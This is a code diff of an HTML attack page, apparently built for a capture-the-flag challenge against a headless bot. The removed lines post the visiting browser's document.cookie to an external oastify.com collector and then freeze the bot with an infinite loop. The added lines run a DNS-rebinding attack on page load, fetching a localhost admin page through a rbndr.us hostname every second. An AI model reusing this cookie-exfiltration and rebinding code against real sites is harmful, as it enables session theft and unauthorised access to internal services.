@@ -4,14 +4,34 @@
     <meta charset="UTF-8">
     <title>😈</title>
     <script>
-      fetch("https://5nt8aq3v5qmszjjlfyfg4en7oyuqiq6f.oastify.com", {
-        method: "POST",
-        mode: "no-cors",
-        body: document.cookie
-      });
+        // Target URL using DNS rebinding
+        const targetUrl = 'http://3e54b282.7f000001.rbndr.us/admin';  // The URL that will resolve 'localhost' to the attacker's server
 
-      // bloquer le bot ici
-      while(true){}
+        // Function to attempt access to the /admin page on localhost (using DNS rebinding)
+        function attemptAccess() {
+            fetch(targetUrl)
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Request successful:', response.status);
+                    } else {
+                        console.error('Request failed:', response.status);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error making GET request:', error);
+                });
+        }
+
+        // Start the attack immediately upon page load
+        window.onload = function() {
+            attemptAccess();
+
+            // Optionally, retry every second to continuously attempt to access the page
+            setInterval(function() {
+                attemptAccess();
+            }, 1000);  // Try every 1000 milliseconds (1 second)
+        };
+      
     </script>
   </head>
   <body>
